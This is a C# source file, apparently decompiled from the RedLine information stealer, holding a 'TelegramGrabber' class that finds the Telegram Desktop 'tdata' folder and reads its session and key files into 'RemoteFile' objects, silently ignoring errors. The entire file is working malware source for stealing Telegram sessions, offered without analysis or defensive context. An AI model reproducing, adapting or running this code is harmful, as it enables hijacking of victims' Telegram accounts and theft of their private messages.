using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using RedLine.Models;

namespace RedLine.Client.Logic.Others
{
	// Token: 0x02000042 RID: 66
	public static class TelegramGrabber
	{
		// Token: 0x0600019F RID: 415 RVA: 0x00005A78 File Offset: 0x00003C78
		private static string GetTdata()
		{
			string result = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata";
			Process[] processesByName = Process.GetProcessesByName("Telegram");
			if (processesByName.Length == 0)
			{
				return result;
			}
			return Path.Combine(Path.GetDirectoryName(TelegramGrabber.ProcessExecutablePath(processesByName[0])), "tdata");
		}

		// Token: 0x060001A0 RID: 416 RVA: 0x00005AC0 File Offset: 0x00003CC0
		private static string ProcessExecutablePath(Process process)
		{
			try
			{
				return process.MainModule.FileName;
			}
			catch
			{
				foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT ExecutablePath, ProcessID FROM Win32_Process").Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					object obj = managementObject["ProcessID"];
					object obj2 = managementObject["ExecutablePath"];
					if (obj2 != null && obj.ToString() == process.Id.ToString())
					{
						return obj2.ToString();
					}
				}
			}
			return "";
		}

		// Token: 0x060001A1 RID: 417 RVA: 0x00005B78 File Offset: 0x00003D78
		public static List<RemoteFile> ParseFiles()
		{
			List<RemoteFile> list = new List<RemoteFile>();
			try
			{
				string tdata = TelegramGrabber.GetTdata();
				string[] directories = Directory.GetDirectories(tdata);
				foreach (string text in Directory.GetFiles(tdata))
				{
					FileInfo fileInfo = new FileInfo(text);
					string name = fileInfo.Name;
					if (fileInfo.Length <= 5120L)
					{
						if (name.EndsWith("s") && name.Length == 17)
						{
							list.Add(new RemoteFile
							{
								Body = File.ReadAllBytes(text),
								FileName = name
							});
						}
						else if (name.StartsWith("usertag") || name.StartsWith("settings") || name.StartsWith("key_data"))
						{
							list.Add(new RemoteFile
							{
								Body = File.ReadAllBytes(text),
								FileName = name
							});
						}
					}
				}
				string[] array = directories;
				for (int i = 0; i < array.Length; i++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(array[i]);
					string name2 = directoryInfo.Name;
					if (name2.Length == 16)
					{
						foreach (FileInfo fileInfo2 in directoryInfo.GetFiles())
						{
							list.Add(new RemoteFile
							{
								Body = File.ReadAllBytes(fileInfo2.FullName),
								FileName = fileInfo2.Name,
								FileDirectory = name2
							});
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}
	}
}
